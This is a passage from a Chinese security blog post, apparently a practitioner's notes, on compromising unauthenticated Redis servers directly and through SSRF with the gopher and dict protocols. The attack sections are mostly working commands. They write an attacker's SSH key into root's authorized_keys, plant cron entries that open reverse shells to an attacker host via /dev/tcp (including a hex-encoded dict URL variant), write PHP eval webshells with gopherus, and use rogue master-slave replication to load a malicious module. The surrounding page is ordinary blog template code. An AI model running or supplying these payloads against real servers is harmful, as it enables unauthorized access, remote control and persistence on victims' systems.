+<p>所谓密钥验证，其实就是一种基于公钥密码的认证，使用公钥加密、私钥解密，其中公钥是可以公开的，放在服务器端，你可以把同一个公钥放在所有你想SSH远程登录的服务器中，而私钥是保密的只有你自己知道，公钥加密的消息只有私钥才能解密，大体过程如下：</p>
+<pre class="line-numbers language-php"><code class="language-php">（<span class="token number">1</span>）客户端生成私钥和公钥，并把公钥拷贝给服务器端； 
+（<span class="token number">2</span>）客户端发起登录请求，发送自己的相关信息
+（<span class="token number">3</span>）服务器端根据客户端发来的信息查找是否存有该客户端的公钥，若没有拒绝登录，若有则生成一段随机数使用该公钥加密后发送给客户端
+（<span class="token number">4</span>）客户端收到服务器发来的加密后的消息后使用私钥解密，并把解密后的结果发给服务器用于验证
+（<span class="token number">5</span>）服务器收到客户端发来的解密结果，与自己刚才生成的随机数比对，若一样则允许登录，不一样则拒绝登录。
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>条件：</p>
+<p>1、Redis服务使用ROOT账号启动</p>
+<p>2、服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。</p>
+<p>其实，思路跟写webshell的思路一样</p>
+<p>一些命令(协议打可能用到)</p>
+<pre class="line-numbers language-php"><code class="language-php">redis<span class="token operator">-</span>cli <span class="token operator">-</span>h <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">33.134</span> <span class="token shell-comment comment">#连接目标主机redis config get dir #检查当前保存路径config get dbfilename #检查保存文件名config set dir /root/.ssh/ #设置保存路径config set dbfilename authorized_keys #设置保存文件名set xz “\n\n\n 公钥 \n\n\n” #将公钥写入xz健save #进行保存</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>首先在攻击机的/root/.ssh目录里生成ssh公钥key：</p>
+<pre class="line-numbers language-php"><code class="language-php">ssh<span class="token operator">-</span>keygen <span class="token operator">-</span>t rsa
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>之后修改上述脚本：</p>
+<pre class="line-numbers language-php"><code class="language-php">path<span class="token operator">=</span> <span class="token string">"/root/.ssh"</span>       <span class="token shell-comment comment">#路径shell= </span><span class="token string">"\\n\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDJE1ZQmknB9zQ1J/HixzTycZMOcXkdqu7hwGRk316cp0Fj0shkV9BbraBzyxKsJyL8bC2aHIEepGQaEQxGRoQOj2BVEmvOFCOgN76t82bS53TEE6Z4/yD3lhA7ylQBYi1Oh9qNkAfJNTm5XaQiCQBvc0xPrGgEQP1SN0UCklY/H3Y+KSpBClk+eESey68etKf+Sl+9xE/SyQCRkD84FhXwQusxxOUUJ4cj1qJiFNqDwy5zu1mLEVtMF23xnxV/WOA4L7cRCw7fqZK/LDoUJXGviF+zzrt9G9Vtrh78YZtvlVxvLDKu8aATlCVAfjtomM1x8I0Mr3tUJyoJLLBVTkMJ9TFfo0WjsqACxEYXC6v/uCAWHcALNUBm0jg/ykthSHe/JwpenbWS58Oy8KmO5GeuCE/ciQjOfI52Ojhxr0e4d9890x/296iuTa9ewn5QmpHKkr+ma2uhhbGEEPwpMkSTp8fUnoqN9T3M9WOc51r3tNSNox2ouHoHWc61gu4XKos= root@kali\\n\\n\\n"</span>   <span class="token shell-comment comment">#公钥filename= </span><span class="token string">"authorized_keys"</span>  <span class="token shell-comment comment">#文件名</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>跑完脚本，然后利用SSH登录攻击机</p>
+<h4 id="创建计划任务反弹shell"><a href="#创建计划任务反弹shell" class="headerlink" title="创建计划任务反弹shell"></a>创建计划任务反弹shell</h4><pre class="line-numbers language-php"><code class="language-php">这个方法只能Centos上使用，Ubuntu上行不通，原因如下：因为默认redis写文件后是<span class="token number">644</span>的权限，但ubuntu要求执行定时任务文件<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>spool<span class="token operator">/</span>cron<span class="token operator">/</span>crontabs<span class="token operator">/</span>权限必须是<span class="token number">600</span>也就是<span class="token operator">-</span>rw——<span class="token operator">-</span>才会执行，否则会报错<span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token constant">INSECURE</span> <span class="token function">MODE</span> <span class="token punctuation">(</span>mode <span class="token number">0600</span> expected<span class="token punctuation">)</span>，而Centos的定时任务文件<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>spool<span class="token operator">/</span>cron<span class="token operator">/</span>权限<span class="token number">644</span>也能执行因为redis保存<span class="token constant">RDB</span>会存在乱码，在Ubuntu上会报错，而在Centos上不会报错由于系统的不同，crontrab定时文件位置也会不同：Centos的定时任务文件在<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>spool<span class="token operator">/</span>cron<span class="token operator">/</span>Ubuntu定时任务文件在<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>spool<span class="token operator">/</span>cron<span class="token operator">/</span>crontabs<span class="token operator">/</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>条件：</p>
+<p>root启用Redis</p>
+<p>redis无密码或者弱密码</p>
+<p>一些命令(协议打可能用到)</p>
+<pre class="line-numbers language-php"><code class="language-php">redis<span class="token operator">-</span>cli <span class="token operator">-</span>h <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">33.134</span> <span class="token shell-comment comment">#连接redis flushall #清除所有键值config set dir /var/spool/cron/crontabs/ #设置保存路径config set dbfilename shell #保存名称set xz “\n* * * * * bash -i >&amp; /dev/tcp/192.168.33.131/8888 0>&amp;1\n” #将反弹shell写入xz键值save #写入保存路径的shell文件</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>先在攻击机监听端口，再运行脚本</p>
+<p>还是改动相应的脚本</p>
+<pre class="line-numbers language-php"><code class="language-php">path <span class="token operator">=</span> <span class="token string">"/var/spool/cron/crontabs"</span>         <span class="token shell-comment comment">#路径shell = </span><span class="token string">"\\n\\n\\n* * * * * bash -i >&amp; /dev/tcp/xxx.xxx.xxx.xxx/xxxx 0>&amp;1\\n\\n\\n"</span>   <span class="token shell-comment comment">#反弹shellfilename = </span><span class="token string">"root"</span>   <span class="token shell-comment comment">#文件名</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="redis主从复制getshell"><a href="#redis主从复制getshell" class="headerlink" title="redis主从复制getshell"></a>redis主从复制getshell</h4><p>原理：</p>
+<p>Redis如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p>
+<p>在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上，然后在从机上加载so文件，我们就可以执行拓展的新命令了。</p>
+<p>条件：</p>
+<pre class="line-numbers language-php"><code class="language-php">Redis 版本<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">.</span>x<span class="token operator">~</span><span class="token number">5.0</span><span class="token punctuation">.</span><span class="token number">5</span><span class="token punctuation">)</span>（新增模块功能，可以通过C语言并编译出恶意<span class="token punctuation">.</span>so文件）redis弱密码或者无密码root启动redis
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>步骤：</p>
+<p>下面这串命令可以具体感受主从复制的原理</p>
+<pre class="line-numbers language-php"><code class="language-php">root@kali<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>桌面<span class="token shell-comment comment"># redis-cli -h 192.168.33.134192.168.33.134:6379> slaveof 192.168.33.131 6379 # 设置主从关系OK192.168.33.134:6379> get xz(nil)192.168.33.134:6379> exitroot@kali:~/桌面# redis-cli  # 写---主机127.0.0.1:6379> get xz(nil)127.0.0.1:6379> set xz xzOK127.0.0.1:6379> exitroot@kali:~/桌面# redis-cli -h 192.168.33.134  # 读---从机192.168.33.134:6379> get xz</span><span class="token string">"xz"</span><span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">33.134</span><span class="token punctuation">:</span><span class="token number">6379</span><span class="token operator">></span> 
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="利用-redis-rogue-server-工具"><a href="#利用-redis-rogue-server-工具" class="headerlink" title="利用 redis-rogue-server 工具"></a>利用 redis-rogue-server 工具</h4><pre class="line-numbers language-php"><code class="language-php">https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//github.com/n0b0dyCN/redis-rogue-server该工具的原理就是首先创建一个恶意的Redis服务器作为Redis主机（master），该Redis主机能够回应其他连接他的Redis从机的响应。有了恶意的Redis主机之后，就会远程连接目标Redis服务器，通过 slaveof 命令将目标Redis服务器设置为我们恶意Redis的Redis从机（slaver）。然后将恶意Redis主机上的exp同步到Reids从机上，并将dbfilename设置为exp.so。最后再控制Redis从机（slaver）加载模块执行系统命令即可。</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>但是该工具无法数据Redis密码进行Redis认证，也就是说该工具只能在目标存在Redis未授权访问漏洞时使用。如果目标Redis存在密码是不能使用该工具的。</p>
+<pre class="line-numbers language-php"><code class="language-php">有两种使用方法一种是交互式shell<span class="token punctuation">,</span>另一种是反弹shell
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-php"><code class="language-php">python3 redis<span class="token operator">-</span>rogue<span class="token operator">-</span>server<span class="token punctuation">.</span>py <span class="token operator">--</span>rhost rhost <span class="token operator">--</span>lhost lhost —rhost为从机，lhost为主机python3 redis<span class="token operator">-</span>rogue<span class="token operator">-</span>server<span class="token punctuation">.</span>py <span class="token operator">--</span>rhost <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">33.134</span> <span class="token operator">--</span>lhost <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">33.131</span>  <span class="token operator">--</span>exp module<span class="token punctuation">.</span>so根据提示输入i进入交互shell
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="交互式shell"><a href="#交互式shell" class="headerlink" title="交互式shell"></a>交互式shell</h4><p>借用师傅的图：</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/36b9cd144222697645e415d27655a040.png"></p>
+<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#### python3 redis-rogue-server.py --rhost 192.168.33.134 --lhost 192.168.33.131 --exp module.so根据提示输入r，接着输入ip和端口进行反弹</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/52a533b0506069e300c3fa1505333f26.png"></p>
+<h2 id="SSRF打redis"><a href="#SSRF打redis" class="headerlink" title="SSRF打redis"></a>SSRF打redis</h2><h4 id="gopherus直接打redis"><a href="#gopherus直接打redis" class="headerlink" title="gopherus直接打redis"></a>gopherus直接打redis</h4><p>利用gopherus<br>这个主要是写webshell</p>
+<pre class="line-numbers language-python"><code class="language-python">python gopherus<span class="token punctuation">.</span>py <span class="token operator">-</span><span class="token operator">-</span>exploit redisphp回车<span class="token operator">&lt;</span>?php eval<span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>然后传入shell，默认生成shell.php<br>访问shell.php,任意命令执行。</p>
+<p>PS：也可以直接用我们上面绝对路径写webshell的直接打有无认证的redis</p>
+<h4 id="dict协议打redis"><a href="#dict协议打redis" class="headerlink" title="dict协议打redis"></a>dict协议打redis</h4><p>探测端口的开放<br>我们直接使用bp的爆破来判断端口的开放,先INFO探测是否设置口令，如果有下图显示，说明就是有的</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/d16aa746644098ed55b1585fa2920758.png"></p>
+<p>然后通过dict://xxx.xxx.xxx:6789/auth:密码，密码放个字典，可以破解弱口令密码</p>
+<h4 id="dict打redis之写入webshell"><a href="#dict打redis之写入webshell" class="headerlink" title="dict打redis之写入webshell"></a>dict打redis之写入webshell</h4><p>命令步骤：</p>
+<pre class="line-numbers language-php"><code class="language-php">更改rdb文件的目录至网站目录下url<span class="token operator">=</span>dict<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//xxx.xxx:6380/config:set:dir:/var/www/html将rdb文件名dbfilename改为webshell的名字url=dict://xxx.xxx:6380/config:set:dbfilename:webshell.php写入webshellurl=dict://xxx.xxx:6380/set:webshell:"\x3c\x3f\x70\x68\x70\x20\x70\x68\x70\x69\x6e\x66\x6f\x28\x29\x3b\x3f\x3e"有些时候可能\x需要换成 \ \x进行转义进行备份dict://xxx.xxx:6380/save</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="dict打redis之计划任务反弹shell"><a href="#dict打redis之计划任务反弹shell" class="headerlink" title="dict打redis之计划任务反弹shell"></a>dict打redis之计划任务反弹shell</h4><p>具体就是dict://xxx.xxx:6380/命令</p>
+<pre class="line-numbers language-php"><code class="language-php">flushall <span class="token shell-comment comment">#清除所有键值config set dir /var/spool/cron/crontabs/ #设置保存路径config set dbfilename shell #保存名称set xz “\n* * * * * bash -i >&amp; /dev/tcp/192.168.33.131/8888 0>&amp;1\n” #将反弹shell写入xz键值save #写入保存路径的shell文件</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token number">1</span><span class="token punctuation">.</span> set <span class="token number">1</span> <span class="token string">'\n\n*/1 * * * * root /bin/bash -i >&amp; /dev/tcp/ip/port 0>&amp;1\n\n'</span> <span class="token number">2</span><span class="token punctuation">.</span>转换一下即： url<span class="token operator">=</span>dict<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//xxx.xxx:6380/set:shell:"\n\n\x2a\x20\x2a\x20\x2a\x20\x2a\x20\x2a\x20root\x20/bin/bash\x20\x2di\x20\x3e\x26\x20/dev/tcp/192.168.124.141/2333\x200\x3e\x261\n\n" 3.但还要注意这里不能够这么写：\x5c 而应该直接就 \n，也不要写\r\n 因为linux换行符就是\n你写\r反而可能会出现参数污染</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="dict打redis之主从复制"><a href="#dict打redis之主从复制" class="headerlink" title="dict打redis之主从复制"></a>dict打redis之主从复制</h4><p>还是提醒:192.168.33.134是从机，192.168.33.131是主机</p>
+<pre class="line-numbers language-php"><code class="language-php">dict<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//192.168.33.134:6379/slaveof:192.168.33.131:6379 dict://192.168.33.134:6379/config:set:dir:/www/admin/localhost_80/wwwrootdict://192.168.33.134:6379/config:set:dbfilename:ssrf.php先设置好保存的路径和保存的文件名然后登入kali进行主从复制操作，方法和上面的一样127.0.0.1:6379> set xxx "\n\n\n&lt;?php phpinfo() ;?>\n\n\n"再去web端执行save操作dict://192.168.33.134:6379/save这样数据直接回同步到目标机</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="redis写lua"><a href="#redis写lua" class="headerlink" title="redis写lua"></a>redis写lua</h4><p>redis2.6之前内置了lua脚本环境在redis未授权的情况下可以利用lua执行系统命令，可以看这个：<a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/drops/papers-3062.html">https://wooyun.x10sec.org/static/drops/papers-3062.html</a></p>
+<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>批量检测未授权redis脚本<br><a target="_blank" rel="noopener" href="https://github.com/Ridter/hackredis">https://github.com/Ridter/hackredis</a></p>
+<p>redis未授权漏洞应急响应案例：<br>redis未授权访问致远程植入挖矿脚本（防御篇）</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/eUTZsGUGSO0AeBUaxq4Q2w">https://mp.weixin.qq.com/s/eUTZsGUGSO0AeBUaxq4Q2w</a></p>
+<p>还有几篇可以看看(日后看看)</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8613">https://xz.aliyun.com/t/8613</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/1800">https://xz.aliyun.com/t/1800</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7333#toc-0">https://xz.aliyun.com/t/7333#toc-0</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6373#toc-8%EF%BC%88%E5%85%B3%E4%BA%8E%E6%97%A0%E5%9B%9E%E6%98%BE%E7%9A%84SSRF%E6%80%9D%E8%80%83%EF%BC%89">https://xz.aliyun.com/t/6373#toc-8（关于无回显的SSRF思考）</a></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">uf9n1x</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://uf9n1x.top/2022/03/31/ssrf-gopher-he-dict-da-redis/">https://uf9n1x.top/2022/03/31/ssrf-gopher-he-dict-da-redis/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">uf9n1x</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/ssrf/">
+                                    <span class="chip bg-color">ssrf</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: '1wgisEeeURi9KOmiSbCm7iil-gzGzoHsz# 必填',
+        appKey: 'cajDtJBhWBdsXmivKuThVNIh# 必填',
+        serverURLs: '',
+        notify: 'false' === 'true',
+        verify: 'false' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'mm',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: 'just go go'
+    });
+</script>
+
+<!--酷Q推送-->
+
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2022/03/31/ssrf-gai-shu/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="ssrf概述">
+                        
+                        <span class="card-title">ssrf概述</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            ssrf概述
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-31
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            uf9n1x
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ssrf/">
+                        <span class="chip bg-color">ssrf</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/03/24/python-ssti-mo-ban-zhu-ru/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="python_SSTI模板注入">
+                        
+                        <span class="card-title">python_SSTI模板注入</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            [TOC]
+一、python_SSTI模板注入介绍
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-24
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" class="post-category">
+                                    模板注入
+                                </a>
+                            
+                            <a href="/categories/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/python/" class="post-category">
+                                    python
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">
+                        <span class="chip bg-color">SSTI模板注入</span>
+                    </a>
+                    
+                    <a href="/tags/python/">
+                        <span class="chip bg-color">python</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE' || selection.getRangeAt(0).commonAncestorContainer.nodeName === 'CODE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: uf9n1x&#39;s blog<br />'
+            + '文章作者: uf9n1x<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
